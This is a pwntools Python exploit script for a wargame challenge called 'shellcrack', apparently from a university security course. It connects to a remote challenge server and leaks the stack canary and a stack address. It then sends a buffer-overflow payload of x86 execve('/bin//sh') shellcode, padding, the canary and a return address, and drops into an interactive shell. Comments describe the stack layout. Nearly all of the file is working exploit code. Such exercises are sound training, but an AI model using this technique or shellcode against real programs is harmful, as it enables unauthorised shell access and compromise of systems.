from pwn import *

p = remote('plsdonthaq.me', 5001)
#p = process('./shellcrack')

p.sendline(b'A'*0xF)

p.recvuntil('This is the 6447 wargaming gateway, ')

p.recvline()
canary = p.recvline().rstrip()[:8]
match = re.search(r'0x[\da-f]+', p.recvline().rstrip().decode())
ebp_0x44 = int(match.group(), 16)


shellcode = asm(""" xor eax, eax
					xor ecx, ecx
					xor edx, edx
					push ecx
					push 0x68732f2f
					push 0x6e69622f
					mov al, 0x0b
					mov ebx, esp
					int 0x80 """)
precanary_padding = b'A'*(0x44-0x14 - len(shellcode))
postcanary_padding = b'A'*(0x14-0x8+0x4)

payload = shellcode + precanary_padding + canary + postcanary_padding + p32(ebp_0x44)

p.sendline(payload)

p.interactive()

#ebx contains constant 0x1fac
# canary at ebp-0x14 and is 8 bytes

# first input buffer is at ebp-0x44 but this is copied to ebp-0x24
# so then 0x10 of our garbage is read and then the canary at ebp-x014

# printed address is ebp-0x44



